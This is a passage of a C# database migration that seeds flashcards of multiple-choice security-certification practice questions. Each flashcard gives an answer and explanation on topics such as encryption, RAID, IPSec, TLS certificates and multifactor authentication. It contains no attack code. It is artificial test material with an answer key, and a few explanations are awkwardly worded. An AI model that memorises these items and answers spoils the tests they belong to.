                values: new object[] { 349, "\r\n132. C. Data sovereignty refers to the concept that data that is\r\ncollected and stored in a country is subject to that country’s\r\nlaws. This can be a complex issue with multinational cloud\r\nservices and providers that may store data in multiple countries\r\nas part of their normal architecture. It may also create\r\ncompliance and other challenges based on differences in\r\nnational laws regarding data, data privacy, and similar issues.\r\n", 2, "\r\n132. Mike is concerned about data sovereignty for data that his organization captures and maintains.\r\nWhat best describes his concern?\r\nA. Who owns the data that is captured on systems hosted in a cloud provider’s infrastructure?\r\nB. Can Mike’s organization make decisions about data that is part of its service, or does\r\nit belong to users?\r\nC. Is the data located in a country subject to the laws of the country where it is stored?\r\nD. Does data have rights on its own, or does the owner of the data determine what rights\r\nmay apply to it?\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 350, "\r\n133. A. Low-power devices typically have limited processor speed,\r\nmemory, and storage, meaning that encryption can be a\r\nchallenge. Fortunately, solutions exist that implement lowpower\r\ncryptographic processing capabilities, and continued\r\nadvances in processor design continue to make lower-power\r\nprocessors faster and more efficient. Legal limitations do not\r\ntypically take into account whether a device is a low-power\r\ndevice, and public key encryption can be implemented on a wide\r\nrange of CPUs and embedded systems, so factoring prime\r\nnumbers is unlikely to be an issue.\r\n", 2, "\r\n133. What are the key limiting factors for cryptography on low-power devices?\r\nA. There are system limitations on memory, CPU, and storage.\r\nB. The devices cannot support public key encryption due to an inability to factor prime\r\nnumbers.\r\nC. There is a lack of chipset support for encryption.\r\nD. Legal limitations for low-power devices prevent encryption from being supported.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 351, "\r\n134. A. A secure cabinet or safe is tamper-proof and provides a good\r\nplace to store anything you are trying to physically protect.\r\nEncrypting thumb drives would require you to store the key\r\nused to encrypt the thumb drive, thus continuing the problem. It\r\nis actually a good practice to store BitLocker keys on removable\r\nmedia, provided that media is safeguarded. In most cases, desk\r\ndrawers are not secure and can easily be broken into, even if\r\nthey are locked.\r\n", 2, "\r\n134. Fred is responsible for physical security in his company. He wants to find a good way to\r\nprotect the USB thumb drives that have BitLocker keys stored on them. Which of the following\r\nwould be the best solution for this situation?\r\nA. Store the drives in a secure cabinet or safe.\r\nB. Encrypt the thumb drives.\r\nC. Don’t store BitLocker keys on these drives.\r\nD. Lock the thumb drives in desk drawers.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 366, "\r\n149. B. Avoiding reuse of the key components of an encryption\r\nprocess means that even if a malicious actor managed to break\r\nthe encryption for a message or exchange, the next new\r\ninitialization vector (IV) and key would require an entirely new\r\nbrute-force attack. Using a new IV and key does not make bruteforce\r\nattacks impossible, nor does it make brute force easier. A\r\nsingle successful attack would expose a single message, or\r\nhowever much data was encrypted using that IV and key.\r\n", 2, "\r\n149. Why is avoiding initialization vector and key reuse recommended to ensure secure\r\nencryption?\r\nA. It makes it impossible to brute force.\r\nB. It means a single successful attack will not expose multiple messages.\r\nC. It means a single successful attack will not expose any messages.\r\nD. It makes brute force easier.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 352, "\r\n135. D. RAID 6, disk striping with dual parity, uses a minimum of\r\nfour disks with distributed parity bits. RAID 6 can handle up to\r\ntwo disks failing. RAID 3 is byte-level striping with dedicated\r\nparity and cannot tolerate more than a single drive failing. RAID\r\n0 is disk striping, which cannot handle disk failure, and RAID 5,\r\ndisk striping with distributed parity, can handle only one disk\r\nfailing.\r\n", 2, "\r\n135. Juanita is responsible for servers in her company. She is looking for a fault-tolerant solution\r\nthat can handle two drives failing. Which of the following should she select?\r\nA. RAID 3\r\nB. RAID 0\r\nC. RAID 5\r\nD. RAID 6\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 354, "\r\n137. C. Static codes are typically recorded in a secure location, but if\r\nthey are not properly secured, or are otherwise exposed, they\r\ncan be stolen. Brute-force attempts should be detected and\r\nprevented by back-off algorithms and other techniques that\r\nprevent attacks against multifactor authentication systems.\r\nCollisions exist with hashing algorithms, not with static\r\nmultifactor codes, and clock mismatch issues occur for timebased\r\none-time password (TOTP) codes.\r\n", 2, "\r\n137. What is the primary threat model against static codes used for multifactor authentication?\r\nA. Brute force\r\nB. Collisions\r\nC. Theft\r\nD. Clock mismatch\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 355, "\r\n138. B. A symmetric cryptosystem will typically perform faster and\r\nwith less processor overhead and thus lower latency than\r\nasymmetric cryptosystems. Hashing is not encryption, and onetime\r\npads are not implemented in modern cryptosystems,\r\nalthough they may have uses in future quantum cryptographic\r\nsolutions.\r\n", 2, "\r\n138. Dennis needs a cryptographic algorithm that provides low latency. What type of cryptosystem\r\nis most likely to meet this performance requirement?\r\nA. Hashing\r\nB. Symmetric encryption\r\nC. Asymmetric encryption\r\nD. Electronic one-time pad\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 356, "\r\n139. A. Industrial camouflage efforts minimize how noticeable a\r\nfacility is, helping it to remain unnoticed by casual observers.\r\nAlthough industrial camouflage can be useful, it is rarely\r\neffective against determined adversaries. A demilitarized zone\r\n(DMZ) in information security terms is a network segment that\r\nis intentionally exposed to the public with appropriate security\r\nprotecting, while stronger security is applied to nonpublic\r\nresources. Disruptive coloration is a camouflage technique but\r\nnot one used in information security. Industrial obfuscation was\r\nmade up for this question.\r\n", 2, "\r\n139. The company that Devin works for has selected a nondescript building and does not use\r\nexterior signage to advertise that the facility belongs to them. What physical security term\r\ndescribes this type of security control?\r\nA. Industrial camouflage\r\nB. Demilitarized zone\r\nC. Industrial obfuscation\r\nD. Disruptive coloration\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 357, "\r\n140. A. Asymmetric cryptography has a relatively high\r\ncomputational overhead, making symmetric key encryption\r\nfaster. That means that once you can exchange an ephemeral\r\nsymmetric key, or a series of keys, you can encrypt and send\r\ndata more quickly and efficiently using symmetric encryption.\r\nThere is no key length limitation, and reasonable lifespans are\r\nmet with either technology. Key reuse is not an issue with a\r\npublic key encryption scheme.\r\n", 2, "\r\n140. Ed knows that TLS sessions start using asymmetric encryption, and then move to use\r\nsymmetric keys. What limitation of asymmetric cryptography drives this design decision?\r\nA. Speed and computational overhead\r\nB. Key length limitations\r\nC. Lifespan (time) to brute force it\r\nD. Key reuse for asymmetric algorithms\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 358, "\r\n141. D. Failure to release memory you have allocated can lead to a\r\nmemory leak. Therefore, if you are using a programming\r\nlanguage like C++ that allows you to allocate memory, make\r\ncertain you deallocate that memory as soon as you are finished\r\nusing it. Allocating only the variable size needed and declaring\r\nvariables where needed are good programming practices.\r\nHowever, failure to follow them just leads to wasteful use of\r\nmemory; it does not lead to a security problem like a memory\r\nleak. Although this is a good idea to prevent buffer overflows, it\r\nis not a memory management issue.\r\n", 2, "\r\n141. When you are concerned about application security, what is the most important issue in\r\nmemory management?\r\nA. Never allocate a variable any larger than is needed.\r\nB. Always check bounds on arrays.\r\nC. Always declare a variable where you need it (i.e., at function or file level if possible).\r\nD. Make sure you release any memory you allocate.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 359, "\r\n142. B. Using a longer key is the best way to make it less likely that\r\nan encrypted file will be cracked. This does not prevent issues\r\nwith the algorithm itself, but if a vulnerability is not found in an\r\nalgorithm, adding key length will help ensure that even\r\nsignificant increases in computational power will not result in\r\nthe encryption being cracked in a reasonable period of time.\r\nQuantum computing has the potential to change this, but\r\npractical quantum encryption cracking tools are not known to be\r\navailable yet. There is no such thing as an anti-quantum cipher,\r\nand a rotating symmetric key might be used to ensure that a key\r\ncould not be cracked but does not provide longevity. Instead, it\r\nis used to allow ephemeral communications to be less likely to\r\nbe cracked on an ongoing basis.\r\n", 2, "\r\n142. Bart wants to ensure that the files he encrypts remain secure for as long as possible. What\r\nshould Bart do to maximize the longevity of his encrypted file’s security?\r\nA. Use a quantum cipher.\r\nB. Use the longest key possible.\r\nC. Use an anti-quantum cipher.\r\nD. Use a rotating symmetric key.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 360, "\r\n143. C. The best answer from this list is DLP, or data loss prevention\r\ntechnology. DLP is designed to protect data from being exposed\r\nor leaking from a network using a variety of techniques and\r\ntechnology. Stateful firewalls are used to control which traffic is\r\nsent to or from a system, but will not detect sensitive data. OEM\r\nis an original equipment manufacturer, and security information\r\nand event management (SIEM) can help track events and\r\nincidents but will not directly protect data itself.\r\n", 2, "\r\n143. Nadine’s organization stores and uses sensitive information, including Social Security numbers.\r\nAfter a recent compromise, she has been asked to implement technology that can help\r\nprevent this sensitive data from leaving the company’s systems and networks. What type of\r\ntechnology should Nadine implement?\r\nA. Stateful firewalls\r\nB. OEM\r\nC. DLP\r\nD. SIEM\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 361, "\r\n144. C. Encryption keys used for quantum key distribution are sent\r\nin the form of qubits. The polarization state of the qubits reflects\r\nthe bit values of the key. Once sent, the receiver can validate the\r\nstate of some of those qubits to ensure both sender and receiver\r\nhave the same key. Bytes and bits are used in traditional data\r\nexchanges, and nuquants were made up for this question.\r\n", 2, "\r\n144. What form is the data used for quantum key distribution sent in?\r\nA. Bytes\r\nB. Bits\r\nC. Qubits\r\nD. Nuquants\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 362, "\r\n145. B. Two-person control schemes require two individuals to be\r\ninvolved to perform an action. This means that Alicia can\r\nimplement a two-person control scheme knowing that both\r\nindividuals would have to be involved to subvert the control\r\nprocess. Biometrics will merely validate that a person is who\r\nthey say they are, robotic sentries do not add any particular\r\nvalue to this scenario, and a demilitarized zone (DMZ) is used to\r\nkeep front-facing systems in a zone that can be controlled and\r\nsecured.\r\n", 2, "\r\n145. Alicia needs to ensure that a process cannot be subverted by a single employee. What\r\nsecurity control can she implement to prevent this?\r\nA. Biometric authentication\r\nB. Two-person control\r\nC. Robotic sentries\r\nD. A DMZ\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 363, "\r\n146. A. Social login is an example of a federated approach to using\r\nidentities. The combination of identity providers and service\r\nproviders, along with authorization management, is a key part of\r\nfederation. AAA is authentication, authorization, and accounting\r\nand is typically associated with protocols like RADIUS. Privilege\r\ncreep occurs as staff members change jobs and their privileges\r\nare not adjusted to only match their current role. IAM is a\r\nbroader set of identity and access management practices.\r\nAlthough IAM may be involved in federated identity, this\r\nquestion does not directly describe IAM.\r\n", 2, "\r\n146. Social login, the ability to use an existing identity from a site like Google, Facebook, or a\r\nMicrosoft account, is an example of which of the following concepts?\r\nA. Federation\r\nB. AAA\r\nC. Privilege creep\r\nD. Identity and access management\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 364, "\r\n147. A. USB data blockers are used to ensure that cables can only be\r\nused for charging, and not for data transfer. None of the other\r\nanswers to this question are used for this purpose, and in fact all\r\nwere made up—USB is a serial bus, circuit breakers are used for\r\npower, and HMAC-based one-time password (HOTP) is a type\r\nof multifactor token algorithm.\r\n", 2, "\r\n147. Michelle is traveling and wants to plug her phone into the charger in her hotel room. What\r\nsecurity precaution can she use to ensure that her phone is not attacked by a malicious\r\ndevice built into the charger in her room?\r\nA. A USB data blocker\r\nB. A parallel USB cable\r\nC. A data circuit breaker\r\nD. An HOTP interrogator\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 353, "\r\n136. C. The ability to record is not included in many traditional\r\nclosed-circuit television (CCTV) monitoring systems and is a key\r\nelement of investigations of theft and other issues. Motion\r\nactivation and facial recognition are typically associated with\r\ncomputer-based camera systems but do not directly address the\r\nconcern Maria is working to handle. Infrared cameras would be\r\nmore useful in spaces where lights were not always in use, such\r\nas outdoors or in facilities that are not occupied at night.\r\n", 2, "\r\n136. Maria’s organization uses a CCTV monitoring system in their main office building, which\r\nis occupied and in use 24-7. The system uses cameras connected to displays to provide\r\nreal-time monitoring. What additional feature is the most likely to receive requests to\r\nensure that her organization can effectively use the CCTV system to respond to theft and\r\nother issues?\r\nA. Motion activation\r\nB. Infrared cameras\r\nC. DVR\r\nD. Facial recognition\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 394, "\r\n177. D. Control diversity means utilizing different controls to\r\nmitigate the same threat. For malware, the use of technical\r\ncontrols, such as antimalware, is critical. But it is also important\r\nto have administrative controls, such as good policies, and to\r\nensure that employees are properly trained. Thus, for this\r\nquestion a combination of policies, training, and tools is the best\r\nanswer.\r\n", 2, "\r\n177. Maria is a security administrator for a large bank. She is concerned about malware, particularly\r\nspyware that could compromise customer data. Which of the following would be the\r\nbest approach for her to mitigate the threat of spyware?\r\nA. Computer usage policies, network antimalware, and host antimalware\r\nB. Host antimalware and network antimalware\r\nC. Host and network antimalware, computer usage policies, and website whitelisting\r\nD. Host and network antimalware, computer usage policies, and employee training\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 395, "\r\n178. A. Although it may seem like Charles has presented two factors,\r\nin fact he has only presented two types of things he knows along\r\nwith his identity. To truly implement a multifactor environment,\r\nhe should use more than one of something you have, something\r\nyou know, and something you are.\r\n", 2, "\r\n178. Charles has configured his multifactor system to require both a PIN and a password.\r\nHow many effective factors does he have in place once he presents both of these and\r\nhis username?\r\nA. One\r\nB. Two\r\nC. Three\r\nD. Four\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 396, "\r\n179. C. Salt reuse is a critical mistake, because it would allow a\r\nrainbow table to be generated using that salt. Although standard\r\nrainbow tables would not work, a reused salt would only require\r\nthe creation of a single new rainbow table. Alphanumeric salts\r\nare not a problem, long salts are not a problem, and this salt is a\r\nreasonable length at 16 characters using hexadecimal.\r\n", 2, "\r\n179. Fred adds the value 89EA443CCDA16B89 to every password as a salt. What issue might\r\nthis cause?\r\nA. The salt is too long.\r\nB. The salt is alphanumeric.\r\nC. The salt is reused.\r\nD. The salt is too short.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 426, "\r\n20. A. IPSec’s Authentication Header (AH) protocol does not\r\nprovide data confidentiality because it secures only the header,\r\nnot the payload. That means that AH can provide integrity and\r\nreplay protection but leaves the rest of the data at risk. Matt\r\nshould note this and express concerns about why the VPN is not\r\nusing Encapsulating Security Protocol (ESP).\r\n", 3, "\r\n20. During a security review, Matt notices that the vendor he is working with lists their IPSec\r\nvirtual private network (VPN) as using AH protocol for security of the packets that it sends.\r\nWhat concern should Matt note to his team about this?\r\nA. AH does not provide confidentiality.\r\nB. AH does not provide data integrity.\r\nC. AH does not provide replay protection.\r\nD. None of the above; AH provides confidentiality, authentication, and replay protection.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 427, "\r\n21. C. Michelle knows that POP3 runs on port 110 by default, and\r\nthat TLS (via STARTTLS as an extension) allows POP3 clients to\r\nrequest a secure connection without needing to use the alternate\r\nport 995 used in some configurations. Port 25 is the default port\r\nfor Simple Mail Transfer Protocol (SMTP), and IKE is used for\r\nIPSec.\r\n", 3, "\r\n21. Michelle wants to secure mail being retrieved via the Post Office Protocol Version 3 (POP3)\r\nbecause she knows that it is unencrypted by default. What is her best option to do this while\r\nleaving POP3 running on its default port?\r\nA. Use TLS via port 25.\r\nB. Use IKE via port 25.\r\nC. Use TLS via port 110.\r\nD. Use IKE via port 110.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 428, "\r\n22. A. A cloud access security broker (CASB) is a software tool or\r\nservice that sits between an organization’s on-premises network\r\nand a cloud provider’s infrastructure. A CASB acts as a\r\ngatekeeper, allowing the organization to extend the reach of\r\ntheir security policies into the cloud.\r\n", 3, "\r\n22. Daniel works for a mid-sized financial institution. The company has recently moved some of\r\nits data to a cloud solution. Daniel is concerned that the cloud provider may not support the\r\nsame security policies as the company’s internal network. What is the best way to mitigate\r\nthis concern?\r\nA. Implement a cloud access security broker.\r\nB. Perform integration testing.\r\nC. Establish cloud security policies.\r\nD. Implement security as a service.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 429, "\r\n23. A. Angela’s company has deployed a version of Session\r\nInitiation Protocol (SIP) that doesn’t use Transport Layer\r\nSecurity (TLS) to maintain confidentiality. She should switch to\r\na SIP Secure (SIPS) implementation to protect the\r\nconfidentiality of phone conversations. Vishing, or voice\r\nphishing; war dialing, which attempts to map all numbers for a\r\nphone service, typically to find modems; and denial of service\r\nare all less likely on a VoIP network, although they could occur.\r\n", 3, "\r\n23. The company that Angela works for has deployed a Voice over IP (VoIP) environment that\r\nuses SIP. What threat is the most likely issue for their phone calls?\r\nA. Call interception\r\nB. Vishing\r\nC. War dialing\r\nD. Denial-of-service attacks\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 430, "\r\n24. B. The fastest way for Alaina to implement secure transport for\r\nher Network Time Protocol (NTP) traffic will typically be to\r\nsimply tunnel the traffic via Secure Shell (SSH) from the NTP\r\nserver to her Linux systems. An IPSec virtual private network\r\n(VPN) between devices will typically take more work to set up\r\nand maintain, although this could be scripted, and a Transport\r\nLayer Security (TLS) VPN would require additional work since it\r\nis intended for web traffic. RDP is the Remote Desktop Protocol\r\nand is primarily used for Windows systems and would not be a\r\ngood choice. In most environments, however, NTP traffic does\r\nnot receive any special security, and NTP sources are trusted to\r\nperform without exceptional security measures.\r\n", 3, "\r\n24. Alaina is concerned about the security of her NTP time synchronization service because she\r\nknows that protocols like TLS and BGP are susceptible to problems if fake NTP messages\r\nwere able to cause time mismatches between systems. What tool could she use to quickly protect\r\nher NTP traffic between Linux systems?\r\nA. An IPSec VPN\r\nB. SSH tunneling\r\nC. RDP\r\nD. A TLS VPN\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 431, "\r\n25. D. The safest and most secure answer is that Ramon should\r\nsimply implement TLS for the entire site. Although TLS does\r\nintroduce some overhead, modern systems can handle large\r\nnumbers of simultaneous TLS connections, making a secure\r\nwebsite an easy answer in almost all cases.\r\n", 3, "\r\n25. Ramon is building a new web service and is considering which parts of the service should use\r\nTransport Layer Security (TLS). Components of the application include:\r\n1. Authentication\r\n2. A payment form\r\n3. User data, including address and shopping cart\r\n4. A user comments and reviews section\r\nWhere should he implement TLS?\r\nA. At points 1 and 2, and 4\r\nB. At points 2 and 3, and 4\r\nC. At points 1, 2, and 3\r\nD. At all points in the infrastructure\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 432, "\r\n26. D. Although IP addresses for public servers and clients are not\r\ntypically considered sensitive, the usernames, passwords, and\r\nfiles that the contractors use would be. Katie should consider\r\nhelping her organization transition to a secure FTP or other\r\nservice to protect her organization’s customers and the\r\norganization itself.\r\n", 3, "\r\n26. Katie’s organization uses File Transfer Protocol (FTP) for contractors to submit their work\r\nproduct to her organization. The contractors work on sensitive customer information, and\r\nthen use organizational credentials provided by Katie’s company to log in and transfer the\r\ninformation. What sensitive information could attackers gather if they were able to capture\r\nthe network traffic involved in this transfer?\r\nA. Nothing, because FTP is a secure protocol\r\nB. IP addresses for both client and server\r\nC. The content of the files that were uploaded\r\nD. Usernames, passwords, and file content\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 433, "\r\n27. D. Dynamic Host Configuration Protocol (DHCP) sniffing or\r\nsnooping can be enabled to prevent rogue DHCP servers as well\r\nas malicious or malformed DHCP traffic. It also allows the\r\ncapture and collection of DHCP binding information to let\r\nnetwork administrators know who is assigned what IP address.\r\n", 3, "\r\n27. What security benefits are provided by enabling DHCP snooping or DHCP sniffing on\r\nswitches in your network?\r\nA. Prevention of malicious or malformed DHCP traffic\r\nB. Prevention of rogue DHCP servers\r\nC. Collection of information about DHCP bindings\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 434, "\r\n28. B. Aaron can use a wildcard certificate to cover all the hosts\r\ninside of a set of subdomains. Wildcards only cover a single level\r\nof subdomain, however, so if he purchased *. example.com, he\r\ncould not use *. blog.example.com. A self-signed certificate will\r\ncause errors for visitors and should not be used for production\r\npurposes. Self-signed certificates will create errors in most\r\nbrowsers and so are not used in production environments.\r\nExtended validation (EV) certificates will not provide this\r\nfunctionality, and Secure Sockets Layer (SSL) is no longer in use\r\nwith the switch to TLS for security reasons.\r\n", 3, "\r\n28. Aaron wants to use a certificate for the following production hosts:\r\nwww.example.com\r\nblog.example.com\r\nnews.example.com\r\nWhat is the most efficient way for him to provide Transport Layer Security (TLS) for all of\r\nthese systems?\r\nA. Use self-signed certificates.\r\nB. Use a wildcard certificate.\r\nC. Use an EV certificate.\r\nD. Use an SSL certificate.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 435, "\r\n29. D. Root Guard can be set on a per-port basis to protect ports\r\nthat will never be set up to be the root bridge for a VLAN. Since\r\nthis shouldn’t change regularly, it is safe to set for most ports in\r\na network. Spanning tree is used to prevent loops, so disabling\r\nSTP would actually make this problem more likely. Bridge IDs\r\ncannot be negative, and BridgeProtect was made up for this\r\nquestion.\r\n", 3, "\r\n29. Cassandra is concerned about attacks against her network’s Spanning Tree Protocol (STP).\r\nShe wants to ensure that a new switch introduced by an attacker cannot change the topology\r\nby asserting a lower bridge ID than the current configuration. What should she implement to\r\nprevent this?\r\nA. Enable BridgeProtect.\r\nB. Set the bridge ID to a negative number.\r\nC. Disable Spanning Tree protocol.\r\nD. Enable Root Guard.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 436, "\r\n30. C. A Personal Information Exchange (PFX) formatted file is a\r\nbinary format used to store server certificates, as well as\r\nintermediary certificates, and it can also contain the server’s\r\nprivate key. Privacy Enhanced Mail (PEM) files can contain\r\nmultiple PEM certificates and a private key, but most systems\r\nstore certificates and the key separately. Distinguished Encoding\r\nRules (DER) format files are frequently used with Java\r\nplatforms and can store all types of certificates and private keys.\r\nP7B, or PKCS#7, formatted files can contain only certificates\r\nand certificate chains, not private keys. For the exam, you\r\nshould also know that a CER is a file extension for an SSL\r\ncertificate file format used by web servers to help verify the\r\nidentity and security of the site in question. SSL certificates are\r\nprovided by a third-party security certificate authority such as\r\nVeriSign, GlobalSign, or Thawte.\r\nA P12 file contains a digital certificate that uses PKCS#12 (Public\r\nKey Cryptography Standard #12) encryption. The P12 file\r\ncontains both the private and the public key, as well as\r\ninformation about the owner (name, email address, etc.), all\r\nbeing certified by a third party. With such a certificate, a user\r\ncan identify themselves and authenticate themselves to any\r\norganization trusting the third party.\r\n", 3, "\r\n30. Charles finds a PFX formatted file on the system he is reviewing. What is a PFX file capable\r\nof containing?\r\nA. Only certificates and chain certificates, not private keys\r\nB. Only a private key\r\nC. A server certificate, intermediate certificates, and the private key\r\nD. None of the above, because PFX files are used for certificate requests only\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 425, "\r\n19. C. Least connection-based load balancing takes load into\r\nconsideration and sends the next request to the server with the\r\nleast number of active sessions. Round robin simply distributes\r\nrequests to each server in order, whereas weighted time uses\r\nhealth checks to determine which server responds the most\r\nquickly on an ongoing basis and then sends the traffic to that\r\nserver. Finally, source IP hashing uses the source and\r\ndestination IP addresses to generate a hash key and then uses\r\nthat key to track sessions, allowing interrupted sessions to be\r\nreallocated to the same server and thus allowing the sessions to\r\ncontinue.\r\n", 3, "\r\n19. Mark is responsible for managing his company’s load balancer and wants to use a loadbalancing\r\nscheduling technique that will take into account the current server load and active\r\nsessions. Which of the following techniques should he choose?\r\nA. Source IP hashing\r\nB. Weighted response time\r\nC. Least connection\r\nD. Round robin\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 437, "\r\n31. D. A firewall has two types of rules. One type is to allow specific\r\ntraffic on a given port. The other type of rule is to deny traffic.\r\nWhat is shown here is a typical firewall rule. Options A, B, and C\r\nare incorrect. The rule shown is clearly a firewall rule.\r\n", 3, "\r\n31. Which device would most likely process the following rules?\r\nPERMIT IP ANY EQ 443\r\nDENY IP ANY ANY\r\nA. NIPS\r\nB. HIPS\r\nC. Content filter\r\nD. Firewall\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 439, "\r\n33. B. Secure cookies are HTTP cookies that have the secure flag\r\nset, thus requiring them to only be sent via a secure channel like\r\nHTTPS. They are not stored in encrypted form or hashed, and\r\ncookie keys were made up for this question.\r\n", 3, "\r\n33. What does setting the secure attribute for an HTTP cookie result in?\r\nA. Cookies will be stored in encrypted form.\r\nB. Cookies will be sent only over HTTPS.\r\nC. Cookies will be stored in hashed form.\r\nD. Cookies must be accessed using a cookie key.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 440, "\r\n34. D. Unlike IPSec’s tunnel mode, IPSec transport mode allows\r\ndifferent policies per port. The IP addresses in the outer header\r\nfor transport mode packets are used to determine the policy\r\napplied to the packet. IPSec doesn’t have a PSK mode, but WPA-\r\n2 does. IKE is used to set up security associations in IPSec but\r\ndoesn’t allow this type of mode setting.\r\n", 3, "\r\n34. Charles wants to use IPSec and needs to be able to determine the IPSec policy for traffic\r\nbased on the port it is being sent to on the remote system. Which IPSec mode should he use?\r\nA. IPSec tunnel mode\r\nB. IPSec IKE mode\r\nC. IPSec PSK mode\r\nD. IPSec transport mode\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 441, "\r\n35. A. WPS personal identification numbers (PINs) were revealed\r\nto be a problem in 2011, when a practical brute-force attack\r\nagainst WPS PIN setup modes was demonstrated. WPS suffers\r\nfrom a variety of other security issues and is not used for\r\nenterprise security. WPS remains in use in home environments\r\nfor ease of setup.\r\n", 3, "\r\n35. Wi-Fi Protected Setup (WPS) includes four modes for adding devices to a network. Which\r\nmode has significant security concerns due to a brute-force exploit?\r\nA. PIN\r\nB. USB\r\nC. Push button\r\nD. Near-field communication\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 442, "\r\n36. C. The Online Certificate Status Protocol, or OCSP, is used to\r\ndetermine the status of a certificate. RTCP, CRBL, and PKCRL\r\nwere all made up for this question.\r\n", 3, "\r\n36. Claire wants to check whether a certificate has been revoked. What protocol is used to validate\r\ncertificates?\r\nA. RTCP\r\nB. CRBL\r\nC. OCSP\r\nD. PKCRL\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
